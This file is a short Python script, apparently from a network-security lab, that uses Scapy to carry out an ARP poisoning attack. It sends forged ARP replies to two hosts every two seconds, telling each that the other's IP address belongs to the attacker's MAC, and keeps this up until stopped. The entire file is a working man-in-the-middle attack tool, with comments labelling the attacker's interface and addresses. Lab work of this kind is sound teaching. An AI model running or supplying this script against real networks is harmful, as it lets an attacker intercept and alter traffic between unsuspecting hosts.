import time

from scapy.all import ARP, Ether, sendp

# === Modify these variables according to your lab environment ===
iface      = "br-318d8411d823"       # Attacker's network interface
att_mac    = "02:42:b8:1d:2b:9b"     # Attacker's MAC address
hostA_ip   = "10.9.0.5"
hostA_mac  = "02:42:0a:09:00:05"     # Host A MAC
hostB_ip   = "10.9.0.6"
hostB_mac  = "02:42:0a:09:00:06"     # Host B MAC
# =================================================================

def poison_once():
    # Tell Host A: "Host B's IP belongs to my (attacker's) MAC"
    pkt_to_A = Ether(dst=hostA_mac) / ARP(
        op=2, hwsrc=att_mac, psrc=hostB_ip,
        hwdst=hostA_mac, pdst=hostA_ip
    )
    sendp(pkt_to_A, iface=iface, verbose=0)

    # Tell Host B: "Host A's IP belongs to my (attacker's) MAC"
    pkt_to_B = Ether(dst=hostB_mac) / ARP(
        op=2, hwsrc=att_mac, psrc=hostA_ip,
        hwdst=hostB_mac, pdst=hostB_ip
    )
    sendp(pkt_to_B, iface=iface, verbose=0)

    print("[*] Sent spoofed ARP packets to both A and B")

if __name__ == "__main__":
    print("[*] Starting ARP poisoning...  (Press Ctrl+C to stop)")
    try:
        while True:
            poison_once()
            time.sleep(2)  # Keep sending to maintain poisoning
    except KeyboardInterrupt:
        print("\n[!] Stopped ARP poisoning.")